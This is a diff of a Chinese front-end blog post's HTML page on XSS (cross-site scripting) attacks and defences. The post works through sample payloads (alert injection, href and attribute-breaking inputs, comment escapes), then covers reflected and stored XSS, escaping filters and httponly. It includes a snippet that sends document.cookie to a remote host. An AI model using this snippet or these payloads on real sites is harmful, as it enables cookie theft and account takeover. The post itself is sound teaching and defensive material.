@@ -116,13 +116,13 @@
 
 
 
-<meta name="description" content="一，xss攻击初探今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。 既然如此，就让我们尝试攻击一下平时我们写的页面  1，第一次尝试攻击 例：我们有上图这样一个采集用户名的输入框 &amp;lt;body&amp;gt;   &amp;lt;div class=&amp;quot;lead&amp;quot;&amp;gt;     您输入的用户名为：">
+<meta name="description" content="一，xss攻击初探今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。 既然如此，就让我们尝试攻击一下平时我们写的页面">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss攻击笔记">
 <meta property="og:url" content="http://yoursite.com/2017/10/11/xss攻击笔记/index.html">
 <meta property="og:site_name" content="丰羡的前端笔记">
-<meta property="og:description" content="一，xss攻击初探今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。 既然如此，就让我们尝试攻击一下平时我们写的页面  1，第一次尝试攻击 例：我们有上图这样一个采集用户名的输入框 &amp;lt;body&amp;gt;   &amp;lt;div class=&amp;quot;lead&amp;quot;&amp;gt;     您输入的用户名为：">
+<meta property="og:description" content="一，xss攻击初探今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。 既然如此，就让我们尝试攻击一下平时我们写的页面">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fkegforr1jj30o80mgq4r.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1fkegiv6yrtj30iw0903yw.jpg">
@@ -141,10 +141,10 @@
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fkfey00f4oj30e803s0td.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fkfi6of9o9j30rw0bkzl1.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fkflrgj951j30ua0rydjp.jpg">
-<meta property="og:updated_time" content="2017-10-12T10:01:48.000Z">
+<meta property="og:updated_time" content="2017-10-18T08:29:37.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss攻击笔记">
-<meta name="twitter:description" content="一，xss攻击初探今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。 既然如此，就让我们尝试攻击一下平时我们写的页面  1，第一次尝试攻击 例：我们有上图这样一个采集用户名的输入框 &amp;lt;body&amp;gt;   &amp;lt;div class=&amp;quot;lead&amp;quot;&amp;gt;     您输入的用户名为：">
+<meta name="twitter:description" content="一，xss攻击初探今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。 既然如此，就让我们尝试攻击一下平时我们写的页面">
 <meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1fkegforr1jj30o80mgq4r.jpg">
 
 
@@ -395,7 +395,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  4,721
+                  4,757
                 </span>
               
 
@@ -411,7 +411,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  18
+                  19
                 </span>
               
             </div>
@@ -432,8 +432,10 @@
       
 
       
-        <h1 id="一，xss攻击初探"><a href="#一，xss攻击初探" class="headerlink" title="一，xss攻击初探"></a>一，xss攻击初探</h1><p>今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。</p>
+        <hr>
+<h1 id="一，xss攻击初探"><a href="#一，xss攻击初探" class="headerlink" title="一，xss攻击初探"></a>一，xss攻击初探</h1><p>今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。</p>
 <p>既然如此，就让我们尝试攻击一下平时我们写的页面</p>
+<a id="more"></a>
 <p><br></p>
 <h2 id="1，第一次尝试攻击"><a href="#1，第一次尝试攻击" class="headerlink" title="1，第一次尝试攻击"></a>1，第一次尝试攻击</h2><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fkegforr1jj30o80mgq4r.jpg" alt=""></p>
 <p>例：我们有上图这样一个采集用户名的输入框</p>
@@ -474,13 +476,13 @@ btn.onclick = ()=&gt;{
 <pre><code>1，在input中输入了&lt;script&gt;alert(1);&lt;/script&gt;
 2, 点击提交
 3，然而span中并没内容，而且alert也没有执行
-</code></pre><p>然而，alert并没有如预期一样被执行，那么检查一下我们的html</p>
+</code></pre><p><br><br>然而，alert并没有如预期一样被执行，那么检查一下我们的html</p>
 <p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fkegu5zxh7j30eg03q3yr.jpg" alt=""></p>
 <p>可以看到script标签已经成功被添加到了span标签内。</p>
 <p><strong>而alert没有执行，是因为w3c规范innerHTML这个api插入的script标签不会被执行</strong></p>
 <p><br></p>
 <h2 id="3，第二次尝试攻击"><a href="#3，第二次尝试攻击" class="headerlink" title="3，第二次尝试攻击"></a>3，第二次尝试攻击</h2><p>想一想，还有没其他途径来攻击呢？</p>
-<p>前面，通过js获取了input输入的内容，那么如果，在js中出现了问题呢？</p>
+<p>前面，通过js获取了input输入的内容，那么如果在js中出现了问题呢？</p>
 <p>例如：输入eval(alert(1))</p>
 <p>当js获取到input的value时候，是否会出现问题？</p>
 <p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fkeju7bt4tj30ie06s74p.jpg" alt=""></p>
@@ -499,10 +501,13 @@ btn.onclick = ()=&gt;{
 </code></pre><p>修改，在js中添加eval方法。</p>
 <p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1fkekri3v03j311s0d4t9w.jpg" alt=""></p>
 <p>这样的话，alert就可以在js环节执行了</p>
-<p>但eval这个方法，本身就不被推荐使用，所以这种低级的场景应该很少。</p>
+<p>但eval这个方法，本身就不被推荐使用，所以这种低级错误的场景应该不常见。</p>
 <p><br></p>
 <h2 id="4，第一小节总结"><a href="#4，第一小节总结" class="headerlink" title="4，第一小节总结"></a>4，第一小节总结</h2><p>1，通过innerHTML方式注入script的方式，失败<br>2，突破js的方案，失败<br>3，eval方法，成功</p>
 <p>可以看出，不是很系统了解过xss攻击的人，其实很难形成有效的攻击，毕竟w3c和ECMA委员会也不是吃干饭的，常见的基础型漏洞，都已经被修复的很完美。</p>
+<p><br></p>
+<hr>
+<p><br></p>
 <h1 id="二，xss攻击入门"><a href="#二，xss攻击入门" class="headerlink" title="二，xss攻击入门"></a>二，xss攻击入门</h1><p>前面的尝试，基本都以失败告终。</p>
 <p>现在开始尝试真正的攻击：</p>
 <h2 id="1，href攻击"><a href="#1，href攻击" class="headerlink" title="1，href攻击"></a>1，href攻击</h2><p>业务场景中，经常有这样一种情况，就是采集到数据后，拼接在href上，用于带到下一个页面，进行数据传递。</p>
@@ -536,8 +541,9 @@ btn.onclick = ()=&gt;{
 <p>此时点击a标签，即发现alert成功弹出了</p>
 <p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fkemnf0fu0j312a0e4jsl.jpg" alt=""></p>
 <p>虽然攻击成功了，但当前的场景也并不多见。</p>
+<p><br></p>
 <h2 id="2，href攻击增强"><a href="#2，href攻击增强" class="headerlink" title="2，href攻击增强"></a>2，href攻击增强</h2><p>业务中，经常会遇到搜索的需求。</p>
-<p>例：将搜索的内容传递给服务器，服务器根据搜索的内容，返回响应的页面内容。</p>
+<p>例：将搜索的内容传递给服务器，服务器根据搜索的内容，返回相应的页面内容。</p>
 <p>现在修改一下之前的代码</p>
 <pre><code>&lt;body&gt;
     &lt;input class=&quot;col-sm-3 form-control&quot; type=&quot;text&quot; id=&quot;text&quot;/&gt;
@@ -585,8 +591,9 @@ btn.onclick = ()=&gt;{
 <p>那么测试一下，移动端uc，chrome，360等，经测试，<strong>攻击无效！！</strong></p>
 <p>虽然攻击无效，但是各移动端浏览器，都没有友善的提示信息，全都是白屏。</p>
 <p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fkfbis6xbqj30o80h6q3m.jpg" alt=""></p>
-<pre><code>其实这个证明不了什么，只能说明web端的浏览器确实是阉割版。
-</code></pre><h3 id="难道真的没有可能吗？"><a href="#难道真的没有可能吗？" class="headerlink" title="难道真的没有可能吗？"></a>难道真的没有可能吗？</h3><p>其实在移动端，对主流浏览器测试，肯定没有问题，毕竟浏览器厂商也不是吃干饭的。</p>
+<p>这说明web端的浏览器确实是阉割版。</p>
+<p><br></p>
+<h3 id="难道真的没有可能吗？"><a href="#难道真的没有可能吗？" class="headerlink" title="难道真的没有可能吗？"></a>难道真的没有可能吗？</h3><p>其实在移动端，对主流浏览器测试，肯定没有问题，毕竟浏览器厂商也不是吃干饭的。</p>
 <p>但如果不是各大浏览器呢，而是原生的webview呢？</p>
 <p>例如各种app中嵌入的h5呢</p>
 <p>这里测试了一个ios应用，使用的是原生的webview，调用的是最普通的浏览器内核，同样是上面的攻击方式。</p>
@@ -596,15 +603,17 @@ btn.onclick = ()=&gt;{
 <pre><code>1，原生webview确实存在漏洞
 2，移动端各主流浏览器，或者使用了非原生内核（腾讯x5），或者添加了防御机制。
 3，很多ios或者android开发者无法意识到这一点。
-</code></pre><h2 id="3，攻击之后呢？"><a href="#3，攻击之后呢？" class="headerlink" title="3，攻击之后呢？"></a>3，攻击之后呢？</h2><p>前面，已经成功将我们所写的js注入到了页面当中。</p>
+</code></pre><p><br></p>
+<h2 id="3，攻击之后呢？"><a href="#3，攻击之后呢？" class="headerlink" title="3，攻击之后呢？"></a>3，攻击之后呢？</h2><p>前面，已经成功将我们所写的js注入到了页面当中。</p>
 <p>既然这样的话，我们就能干很多事情了，例如：</p>
 <pre><code>&lt;script&gt;
      var img = new Image();
     img.src = &quot;http://www.xss.com/getcookie?cookie=&quot; + document.cookie;
     document.body.append(img);
 &lt;/script&gt;
-</code></pre><p>如上，就是通过漏洞注入script代码，获取cookie并发送到远程服务器</p>
+</code></pre><p>如上，就是通过漏洞注入script代码，获取cookie并发送到远程黑客的服务器上，攻击者获取了用户的cookie，就能够伪装成用户来进行非法操作了。</p>
 <p>上面这种向代码中添加script脚本的方式，其实就是XSS</p>
+<p><br></p>
 <h1 id="三，xss攻击晋级"><a href="#三，xss攻击晋级" class="headerlink" title="三，xss攻击晋级"></a>三，xss攻击晋级</h1><h2 id="1，demo存在的问题"><a href="#1，demo存在的问题" class="headerlink" title="1，demo存在的问题"></a>1，demo存在的问题</h2><p>前面的例子，其实还存在问题：</p>
 <pre><code>1，当前操作人，是开发者||黑客自身
 2，获取的cookie也还是自己的
@@ -631,7 +640,8 @@ btn.onclick = ()=&gt;{
 2，如果这个链接是拼接好的baidu的某个xss攻击链接。
 3，当点击之后，进入百度的某个页面。
 4，xss脚本执行，获取了百度账号的cookie，发送到了远程服务器。
-</code></pre><h2 id="2，xss分类"><a href="#2，xss分类" class="headerlink" title="2，xss分类"></a>2，xss分类</h2><p>ok，前面我们已经了解过了一种xss攻击方式，就是生成一个链接，让其他人去点击。</p>
+</code></pre><p><br></p>
+<h2 id="2，xss分类"><a href="#2，xss分类" class="headerlink" title="2，xss分类"></a>2，xss分类</h2><p>ok，前面我们已经了解过了一种xss攻击方式，就是生成一个链接，让其他人去点击。</p>
 <h5 id="存在的问题："><a href="#存在的问题：" class="headerlink" title="存在的问题："></a>存在的问题：</h5><p>毕竟还是要生成链接，而且扩散费劲，还需要用户手动点击，总的来说不够理想。</p>
 <p>那么有没有更快捷的攻击方式。</p>
 <p>回顾一下，前面的攻击流程：</p>
@@ -652,9 +662,10 @@ btn.onclick = ()=&gt;{
 3，凡是观看到的用户，都会被攻击
 </code></pre><p>两种常见的工具方式都已经了解过了</p>
 <p>其中，第一种通过生成链接的方式进行攻击，叫做：</p>
-<h4 id="“反射型xss”"><a href="#“反射型xss”" class="headerlink" title="“反射型xss”"></a>“反射型xss”</h4><p>反射型，可以简单理解成，给服务器发什么，服务器就返回什么，就像小学生打王者，骂不过的一句“反弹”</p>
+<h4 id="“反射型xss”"><a href="#“反射型xss”" class="headerlink" title="“反射型xss”"></a>“反射型xss”</h4><p>反射型，可以简单理解成，给服务器发什么，服务器就返回什么。</p>
 <p>而，第二种富文本夹带攻击代码的方式，叫做：</p>
 <h4 id="“存储型xss”"><a href="#“存储型xss”" class="headerlink" title="“存储型xss”"></a>“存储型xss”</h4><p>存储型，主要是攻击代码已经被保存到服务器，所有用户都能够被攻击，危害比反射型要高，主要体现在博客论坛等。</p>
+<p><br></p>
 <h1 id="四，xss防御"><a href="#四，xss防御" class="headerlink" title="四，xss防御"></a>四，xss防御</h1><h2 id="1-xss-filter"><a href="#1-xss-filter" class="headerlink" title="1,xss filter"></a>1,xss filter</h2><p>xss攻击主要是脚本注入，如果让脚本注入不进来，这样不就是行了嘛</p>
 <pre><code>content
   .replace(/&amp;/g, &quot;&amp;amp;&quot;)
@@ -804,7 +815,7 @@ btn.onclick = ()=&gt;{
   }
   return &apos;Invalid URL&apos;
 }
-</code></pre><p>上面的内容表示，输入的内容会变成样式，而且过滤了style的结束标记</p>
+</code></pre><p>上面代码，是验证输入的内容，是<a href="https://www.segmentfault.com下的内容" target="_blank" rel="external">https://www.segmentfault.com下的内容</a></p>
 <p>input code：</p>
 <pre><code>https://www.segmentfault.com/&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//
 </code></pre><p>利用没有对“”进行过滤，提前添加“&gt;结束第一个标签，并闭合，再通过//注释掉后面的内容</p>
@@ -841,7 +852,8 @@ btn.onclick = ()=&gt;{
 }
 </code></pre><p>上面的代码，输入的内容，会被转译到注释里面，同时还过滤了&lt;,/,“,’这四个符号</p>
 <p>input code：</p>
-<pre><code>alert(1)
+<pre><code>---
+alert(1)
 --&gt;
 </code></pre><p>1,换行,用于逃逸注释,但还有’单引号在，alert还是不会执行</p>
 <p>2，利用html–&gt;注释符号来注释掉后面的单引号，以及多余的代码</p>
@@ -884,7 +896,11 @@ btn.onclick = ()=&gt;{
 <li><p>（4）书写要严格规范</p>
 <p>  正则要考虑全面（例如换行），注释内不要有变量等。</p>
 </li>
+<li><p>（5）http only</p>
+<p>  xss的目的大部分都是为了获取cookie，如果设置了httponly则能够有效的防止被攻击后的操作。</p>
+</li>
 </ul>
+<p><br></p>
 <h3 id="3，使用框架需要注意的地方"><a href="#3，使用框架需要注意的地方" class="headerlink" title="3，使用框架需要注意的地方"></a>3，使用框架需要注意的地方</h3><p>大部分业务场景其实都是通过框架来执行的</p>
 <h4 id="node的模版引擎ejs"><a href="#node的模版引擎ejs" class="headerlink" title="node的模版引擎ejs"></a>node的模版引擎ejs</h4><pre><code>&lt;%- value %&gt;
 &lt;%= value %&gt;
@@ -976,6 +992,10 @@ btn.onclick = ()=&gt;{
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/12/csrf-攻击及防御/" rel="prev" title="csrf 攻击及防御">
+                csrf 攻击及防御 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -1077,7 +1097,7 @@ btn.onclick = ()=&gt;{
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-count">10</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1090,7 +1110,7 @@ btn.onclick = ()=&gt;{
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -1179,7 +1199,7 @@ btn.onclick = ()=&gt;{
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共15.2k字</span>
+  <span class="post-count">博客全站共16.4k字</span>
 </div>
 <span>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
 
